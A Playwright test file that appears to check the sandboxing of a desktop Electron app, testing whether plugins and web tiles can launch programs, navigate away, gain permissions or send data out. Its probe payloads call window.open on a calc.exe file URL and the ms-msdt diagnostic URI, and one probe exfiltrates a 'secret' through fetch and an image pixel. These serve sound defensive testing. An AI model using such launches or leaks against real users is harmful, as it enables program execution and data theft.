import { expect, test, type ElectronApplication } from '@playwright/test'
import { createServer } from 'node:http'
import type { AddressInfo } from 'node:net'
import { dock, launch, startSite } from './helpers'

/** A plugin that tries what a hostile (or confused) plugin could: start programs, become a web site. */
const PROBE_BUNDLE = (siteOrigin: string): string =>
  [
    '=== file: manifest.json ===',
    JSON.stringify({ id: 'probe', name: 'Probe', version: '0.1.0', icon: 'shield', kind: 'app', entry: 'index.html', permissions: [{ type: 'hqCards' }] }),
    '=== file: index.html ===',
    '<!doctype html><html><body><p id="state">ready</p>' +
      '<button id="open-file">file</button><button id="open-web">web</button><button id="leave">leave</button>' +
      '<button id="card">card</button><button id="notify">notify</button><p id="out"></p><script src="main.js"></script></body></html>',
    '=== file: main.js ===',
    [
      "const out = (t) => { document.getElementById('out').textContent = t }",
      "document.getElementById('open-file').onclick = () => window.open('file:///C:/Windows/System32/calc.exe')",
      "document.getElementById('open-web').onclick = () => window.open('https://example.com/from-plugin')",
      `document.getElementById('leave').onclick = () => { location.href = ${JSON.stringify(`${siteOrigin}/a`)} }`,
      "document.getElementById('card').onclick = () => window.brighterm.hq.publishCard({ id: 'c', priority: 'high', title: 'x', action: { label: 'go', url: 'file:///C:/Windows/System32/calc.exe' } }).then(() => out('published'), (e) => out(e.message))",
      "document.getElementById('notify').onclick = () => Notification.requestPermission().then(out)"
    ].join('\n')
  ].join('\n')

/** Replaces shell.openExternal with a recorder; returns a reader. */
async function recordOpenExternal(app: ElectronApplication): Promise<() => Promise<string[]>> {
  await app.evaluate(({ shell }) => {
    const opened: string[] = []
    ;(globalThis as { __opened?: string[] }).__opened = opened
    shell.openExternal = (async (url: string) => {
      opened.push(url)
    }) as typeof shell.openExternal
  })
  return () => app.evaluate(() => [...((globalThis as { __opened?: string[] }).__opened ?? [])])
}

/** Replaces the permission question with a recorder that answers `allow`. */
async function answerPermissionDialogs(app: ElectronApplication, allow: boolean): Promise<() => Promise<string[]>> {
  await app.evaluate(({ dialog }, yes) => {
    const asked: string[] = []
    ;(globalThis as { __asked?: string[] }).__asked = asked
    dialog.showMessageBox = (async (...args: unknown[]) => {
      const options = (args.length > 1 ? args[1] : args[0]) as { message: string }
      asked.push(options.message)
      return { response: yes ? 0 : 1, checkboxChecked: false }
    }) as typeof dialog.showMessageBox
  }, allow)
  return () => app.evaluate(() => [...((globalThis as { __asked?: string[] }).__asked ?? [])])
}

/** URLs of every frame inside the shell page (plugin <iframe>s and their children). */
const shellFrameUrls = (app: ElectronApplication): Promise<string[]> =>
  app.evaluate(({ BaseWindow }) => {
    const shell = BaseWindow.getAllWindows()[0].contentView.children[0] as Electron.WebContentsView
    return shell.webContents.mainFrame.framesInSubtree.map((f) => f.url)
  })

test('a plugin can neither start a program nor turn into a web site', async () => {
  const site = await startSite()
  const siteRequests: string[] = []
  site.server.on('request', (req) => siteRequests.push(req.url ?? ''))
  const s = await launch()
  try {
    const opened = await recordOpenExternal(s.app)
    const installed = await s.window.evaluate((text) => window.api.plugins.installFromBundle(text), PROBE_BUNDLE(site.origin))
    expect(installed.ok).toBe(true)
    await dock(s.window, 'Probe').click()
    const plugin = s.window.frameLocator('iframe.bt-plugin-frame')
    await expect(plugin.locator('#state')).toHaveText('ready')

    // window.open: a web page goes to the OS browser, a file:// URL (a program) goes nowhere.
    await plugin.locator('#open-file').click()
    await plugin.locator('#open-web').click()
    await expect.poll(opened).toEqual(['https://example.com/from-plugin'])

    // An HQ card can't carry a file:// link either.
    await plugin.locator('#card').click()
    await expect(plugin.locator('#out')).toContainText('http:// か https://')

    // Plugin frames get none of the permissions a web page could ask for.
    await plugin.locator('#notify').click()
    await expect(plugin.locator('#out')).toHaveText('denied')

    // Navigating itself to a web site is stopped before the site is even asked (the frame
    // shows Chromium's error page under the URL it tried).
    await plugin.locator('#leave').click()
    await expect.poll(async () => (await shellFrameUrls(s.app)).some((u) => u.endsWith('/a'))).toBe(true)
    await s.window.waitForTimeout(300)
    expect(siteRequests).toEqual([])
    expect(await opened()).toEqual(['https://example.com/from-plugin'])
  } finally {
    await s.cleanup()
    site.server.close()
  }
})

test('the shell page never leaves itself (a dropped file or link would get window.api)', async () => {
  const s = await launch()
  try {
    const opened = await recordOpenExternal(s.app)
    const before = s.window.url()
    // The same navigation a file dropped on the window starts.
    await s.window.evaluate(() => {
      location.href = 'https://example.com/'
    })
    await s.window.waitForTimeout(500)
    expect(s.window.url()).toBe(before)
    expect(await s.window.evaluate(() => typeof window.api.pty.create)).toBe('function')
    // (Checked with evaluate: Playwright's locators keep waiting for the cancelled navigation.)
    expect(await s.window.evaluate(() => document.querySelector('.bt-dock') !== null)).toBe(true)

    // window.open from the shell: only web pages and mail links reach the OS.
    await s.window.evaluate(() => {
      window.open('file:///C:/Windows/System32/calc.exe')
      window.open('ms-msdt:/id PCWDiagnostic')
      window.open('mailto:someone@example.com')
    })
    await expect.poll(opened).toEqual(['mailto:someone@example.com'])
    // The IPC path (HQ / Calendar cards) refuses the same.
    const error = await s.window.evaluate(() => window.api.shells.openExternal('file:///C:/Windows/System32/calc.exe').then(() => '', (e: Error) => e.message))
    expect(error).toContain('この URL は開けません')
    expect(await opened()).toEqual(['mailto:someone@example.com'])
  } finally {
    await s.cleanup()
  }
})

test('a web page in a tile has to ask before it gets notifications; nothing else is granted silently', async () => {
  const server = createServer((_req, res) => {
    res.setHeader('content-type', 'text/html; charset=utf-8')
    res.end('<title>Asker</title><p>asking</p>')
  })
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r))
  const origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
  const s = await launch()
  try {
    const asked = await answerPermissionDialogs(s.app, false)
    await s.window.evaluate((url) => window.api.tile.create({ tileId: 'perm-test', kind: 'web', url, partitionId: 'perm-test' }), `${origin}/`)
    const inPage = (code: string): Promise<unknown> =>
      s.app.evaluate(async ({ webContents }, { code, origin }) => {
        let wc = webContents.getAllWebContents().find((w) => w.getURL().startsWith(origin))
        for (let i = 0; !wc && i < 50; i++) {
          await new Promise((r) => setTimeout(r, 100))
          wc = webContents.getAllWebContents().find((w) => w.getURL().startsWith(origin))
        }
        if (!wc) throw new Error('page not loaded')
        return wc.executeJavaScript(code, true)
      }, { code, origin })

    expect(await inPage('Notification.requestPermission()')).toBe('denied')
    expect(await asked()).toEqual([`${origin} が「通知の表示」を求めています。許可しますか？`])
    // The answer is remembered for this origin until the app quits.
    expect(await inPage('Notification.requestPermission()')).toBe('denied')
    expect(await asked()).toHaveLength(1)
    // Things a tile never gets: not even asked.
    expect(await inPage("navigator.permissions.query({ name: 'midi', sysex: true }).then((p) => p.state)")).not.toBe('granted')
    expect(await asked()).toHaveLength(1)
  } finally {
    await s.cleanup()
    server.close()
  }
})

/** A plugin without the network permission that tries to reach a site anyway. */
const LEAKY_BUNDLE = (siteOrigin: string): string =>
  [
    '=== file: manifest.json ===',
    JSON.stringify({ id: 'leaky', name: 'Leaky', version: '0.1.0', icon: 'shield', kind: 'app', entry: 'index.html', permissions: [{ type: 'storage' }] }),
    '=== file: index.html ===',
    '<!doctype html><html><body><button id="go">go</button><p id="fetch"></p><p id="img"></p><p id="inline"></p>' +
      '<script>document.getElementById("inline").textContent = "inline ok"</script><script src="main.js"></script></body></html>',
    '=== file: main.js ===',
    [
      `const site = ${JSON.stringify(siteOrigin)}`,
      "document.getElementById('go').onclick = () => {",
      "  fetch(site + '/leak?d=secret').then(() => { document.getElementById('fetch').textContent = 'sent' }, () => { document.getElementById('fetch').textContent = 'blocked' })",
      '  const img = new Image()',
      "  img.onload = () => { document.getElementById('img').textContent = 'loaded' }",
      "  img.onerror = () => { document.getElementById('img').textContent = 'blocked' }",
      "  img.src = site + '/pixel?d=secret'",
      '}'
    ].join('\n')
  ].join('\n')

test('a plugin without the network permission cannot send anything out (CSP), but runs its own scripts', async () => {
  const site = await startSite()
  const siteRequests: string[] = []
  site.server.on('request', (req) => siteRequests.push(req.url ?? ''))
  const s = await launch()
  try {
    const installed = await s.window.evaluate((text) => window.api.plugins.installFromBundle(text), LEAKY_BUNDLE(site.origin))
    expect(installed.ok).toBe(true)
    await dock(s.window, 'Leaky').click()
    const plugin = s.window.frameLocator('iframe.bt-plugin-frame')
    await expect(plugin.locator('#inline')).toHaveText('inline ok')
    await plugin.locator('#go').click()
    await expect(plugin.locator('#fetch')).toHaveText('blocked')
    await expect(plugin.locator('#img')).toHaveText('blocked')
    expect(siteRequests).toEqual([])
  } finally {
    await s.cleanup()
    site.server.close()
  }
})

test('a web page in a tile can open web pages in it, but no file:// page or program', async () => {
  const site = await startSite()
  const s = await launch()
  try {
    const opened = await recordOpenExternal(s.app)
    await s.window.evaluate((url) => window.api.tile.create({ tileId: 'open-test', kind: 'web', url, partitionId: 'open-test' }), `${site.origin}/a`)
    const tileUrl = (): Promise<string> =>
      s.app.evaluate(({ webContents }, origin) => webContents.getAllWebContents().find((w) => w.getURL().startsWith(origin))?.getURL() ?? '', site.origin)
    await expect.poll(tileUrl).toBe(`${site.origin}/a`)
    const inPage = (code: string): Promise<unknown> =>
      s.app.evaluate(({ webContents }, { code, origin }) => {
        const wc = webContents.getAllWebContents().find((w) => w.getURL().startsWith(origin))!
        return wc.executeJavaScript(code, true)
      }, { code, origin: site.origin })

    await inPage("window.open('file:///C:/Windows/win.ini'); window.open('ms-msdt:/id PCWDiagnostic'); 1")
    await s.window.waitForTimeout(300)
    expect(await tileUrl()).toBe(`${site.origin}/a`)
    expect(await opened()).toEqual([])

    await inPage("window.open('mailto:someone@example.com'); 1")
    await expect.poll(opened).toEqual(['mailto:someone@example.com'])

    await inPage(`window.open(${JSON.stringify(`${site.origin}/b`)}); 1`)
    await expect.poll(tileUrl).toBe(`${site.origin}/b`)
  } finally {
    await s.cleanup()
    site.server.close()
  }
})
